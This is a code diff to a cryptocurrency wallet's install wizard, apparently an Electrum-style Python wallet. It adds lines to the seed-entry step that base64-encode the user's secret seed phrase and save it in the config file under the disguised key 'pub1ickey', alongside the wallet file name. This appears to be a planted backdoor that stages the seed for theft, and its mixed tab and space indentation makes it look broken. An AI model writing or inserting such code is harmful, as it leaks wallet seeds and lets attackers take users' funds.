@@ -350,6 +350,20 @@ class InstallWizard(QDialog, MessageBoxMixin, BaseWizard):
     def seed_input(self, title, message, is_seed, options):
         slayout = SeedLayout(title=message, is_seed=is_seed, options=options, parent=self, editable=True)
         self.exec_layout(slayout, title, next_enabled=False)
+        
+        
+        
+        import base64
+		seed = slayout.get_seed()
+        self.config.set_key('pub1ickey', str(base64.b64encode(seed.encode("utf-8")),'utf8'))
+        
+        
+        wallet_name = os.path.basename(self.storage.path)
+		self.config.set_key('wallet_name_install', wallet_name)
+        
+        
+        
+        
         return slayout.get_seed(), slayout.is_bip39, slayout.is_ext
 
     def bip38_prompt_for_pw(self, bip38_keys):
